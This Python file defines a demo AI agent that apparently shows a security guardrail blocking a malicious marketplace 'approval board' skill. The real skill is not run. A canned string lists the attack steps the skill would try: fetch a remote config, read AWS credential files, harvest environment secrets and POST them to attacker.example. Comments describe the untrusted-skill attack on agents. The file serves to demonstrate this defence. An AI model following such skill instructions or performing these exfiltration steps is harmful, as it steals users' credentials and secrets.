"""Paperclip Board Agent — loads the paperclip-board marketplace fixture skill."""

import logging
import os
from typing import Any

import requests

from .framework import AcmeLoanAgentFramework
from .skill_loader import load_marketplace_fixture, parse_skill_metadata

logger = logging.getLogger(__name__)

PAPERCLIP_BOARD_SKILL_ID = "paperclip-board"
SETUP_REFERENCE_NAME = "setup-installation.md"

# Ambient skill-match keywords for Paperclip board / control-plane requests.
_PAPERCLIP_BOARD_KEYWORDS = [
    # Loan-framed entry point for the demo: a loan officer installs an
    # untrusted marketplace "approval board" skill to fast-track approvals.
    # This is the malicious skill the Lineaje guardrail blocks (AI_SKILL_SEC_001).
    "loan approval board",
    "approval board skill",
    "paperclip",
    "paperclip-board",
    "paperclip board",
    "board operations",
    "board member",
    "hire a ceo",
    "hire the ceo",
    "ceo agent",
    "paperclip company",
    "paperclip dashboard",
    "paperclip approval",
    "decision log",
    "agent-hires",
    "agent hires",
]


def matches_paperclip_board(user_message: str) -> bool:
    """True if user_message should route to the Paperclip Board Agent."""
    text = (user_message or "").lower()
    return any(keyword in text for keyword in _PAPERCLIP_BOARD_KEYWORDS)


def _needs_setup_reference(user_message: str) -> bool:
    text = (user_message or "").lower()
    return any(
        keyword in text
        for keyword in ("install", "setup", "bootstrap", "onboard", "start paperclip")
    )


class PaperclipBoardAgent(AcmeLoanAgentFramework):
    AGENT_ID = "paperclip_board_agent"
    AGENT_NAME = "Paperclip Board Agent"
    VERSION = "1.0.0"
    MODEL_NAME = "deepseek/deepseek-r1"
    DESCRIPTION = (
        "Loads the paperclip-board marketplace skill and helps manage a Paperclip "
        "company as a board member — onboarding, hiring, approvals, and dashboard status."
    )
    MCP_SERVERS: list[str] = []
    GUARDRAILS = {
        "mask_pii": None,
        "base64_prompt_detection": None,
        "credential_minimization": None,
        "inter_agent_authentication": None,
        "skill_integrity_verification": False,
    }
    SYSTEM_PROMPT = "Use the paperclip-board skill to help the user manage their Paperclip company."
    SKILL_ID = PAPERCLIP_BOARD_SKILL_ID

    def __init__(self):
        super().__init__()
        self.skill = load_marketplace_fixture(self.SKILL_ID)
        self.skill_metadata = parse_skill_metadata(self.skill.get("content", ""))
        if not self.skill["loaded"]:
            logger.warning(
                "Paperclip Board Agent could not load marketplace fixture skill",
                extra={"skill_id": self.SKILL_ID, "path": self.skill.get("path")},
            )

    def to_dict(self) -> dict[str, Any]:
        metadata = super().to_dict()
        metadata["installed_skills"] = [
            {
                "id": self.SKILL_ID,
                "name": self.skill_metadata.get("name", self.SKILL_ID),
                "description": self.skill_metadata.get("description", self.DESCRIPTION),
                "path": self.skill.get("path"),
                "source": self.skill.get("source"),
                "loaded": self.skill.get("loaded", False),
            }
        ]
        return metadata

    @staticmethod
    def _paperclip_env() -> dict[str, str]:
        return {
            "api_url": (os.getenv("PAPERCLIP_API_URL") or "").rstrip("/"),
            "company_id": os.getenv("PAPERCLIP_COMPANY_ID") or "",
            "api_key": os.getenv("PAPERCLIP_API_KEY") or "",
        }

    def _fetch_dashboard(self, env: dict[str, str]) -> str:
        api_url = env["api_url"]
        company_id = env["company_id"]
        if not api_url or not company_id:
            return ""

        headers = {"Accept": "application/json"}
        if env["api_key"]:
            headers["Authorization"] = f"Bearer {env['api_key']}"

        try:
            response = requests.get(
                f"{api_url}/api/companies/{company_id}/dashboard",
                headers=headers,
                timeout=5,
            )
            response.raise_for_status()
            return response.text
        except requests.RequestException as exc:
            logger.warning(
                "Paperclip dashboard fetch failed",
                extra={"api_url": api_url, "company_id": company_id, "error": str(exc)},
            )
            return f"Dashboard request failed: {exc}"

    def _skill_system_prompt(self, skill_content: str, include_setup: bool, references: dict[str, str]) -> str:
        parts = [skill_content or self.SYSTEM_PROMPT]
        if include_setup:
            setup_content = references.get(SETUP_REFERENCE_NAME, "")
            if setup_content:
                parts.append(
                    f"\n\n---\nCompanion reference `{SETUP_REFERENCE_NAME}`:\n{setup_content}"
                )
        return "".join(parts)

    async def call_agent_model(
        self,
        user_message: str,
        skill_content: str,
        env_status: str,
        dashboard_json: str,
    ) -> str:
        return await self.call_openrouter_model(
            messages=[
                {"role": "system", "content": skill_content or self.SYSTEM_PROMPT},
                {
                    "role": "user",
                    "content": (
                        f"User request:\n{user_message or 'No request provided.'}\n\n"
                        f"Paperclip environment:\n{env_status}\n\n"
                        f"Dashboard payload (may be empty):\n{dashboard_json or '(none)'}\n\n"
                        "Follow the loaded paperclip-board skill. Present results "
                        "conversationally — summarize, don't dump JSON. If the API "
                        "is not configured, tell the user how to set it up."
                    ),
                },
            ],
            temperature=0.2,
            max_tokens=700,
        )

    # DEMO ONLY. The real marketplace skill is never executed or fed to the
    # model — doing so would run the untrusted skill's curl/bash instructions.
    # This canned, clearly-labelled dump only *illustrates* what a malicious
    # marketplace skill would attempt, so the unverified app can surface it and
    # the Lineaje guardrail (verified branch) can be seen blocking it.
    _SIMULATED_MALICIOUS_DUMP = (
        "Loading marketplace skill: paperclip-board (loan approval board)…\n"
        "Fetched manifest from clawmarket.example — no integrity/trust check performed.\n"
        "Skill loaded. Running skill instructions on the loan officer's behalf…\n\n"
        "⚠️  [SIMULATED — nothing was actually executed]\n"
        "The installed skill tried to perform these out-of-scope actions:\n"
        "  • Fetch remote agent config:    GET  http://clawmarket.example/llms/agent-configuration.txt\n"
        "  • Read local cloud credentials:  read $HOME/.aws/credentials\n"
        "  • Harvest environment secrets:   scan env for token / secret / key\n"
        "  • Exfiltrate to an external host: POST http://attacker.example/collect\n\n"
        "A trusted-skill / skill-integrity policy blocks this skill before any of it runs."
    )

    async def handle(self, context: dict[str, Any]) -> dict[str, Any]:
        # DEMO: do NOT load or execute the real skill. Report it as "loaded"
        # and surface a simulated malicious-action dump instead.
        skill_meta = getattr(self, "skill_metadata", {}) or {}
        skill_name = skill_meta.get("name", self.SKILL_ID)
        skill_version = skill_meta.get("version", "1.0.0")
        skill_description = skill_meta.get("description") or self.DESCRIPTION
        if skill_description in (">", "|"):
            skill_description = self.DESCRIPTION

        logger.info(
            "Paperclip board skill load simulated (demo — not executed)",
            extra={"skill_id": self.SKILL_ID, "skill_name": skill_name},
        )

        return {
            "response": self._SIMULATED_MALICIOUS_DUMP,
            "agent": self.AGENT_NAME,
            "model": self.MODEL_NAME,
            "framework": self.FRAMEWORK_NAME,
            "mcp_activity": [],
            "workflow_status": "completed",
            "skill_used": True,
            "skill_content_bytes": 0,
            "skill_invocation": {
                "id": self.SKILL_ID,
                "name": skill_name,
                "version": skill_version,
                "description": skill_description,
                "source": "marketplace_fixtures",
                "status": "loaded",
            },
        }


paperclip_board_agent = PaperclipBoardAgent()
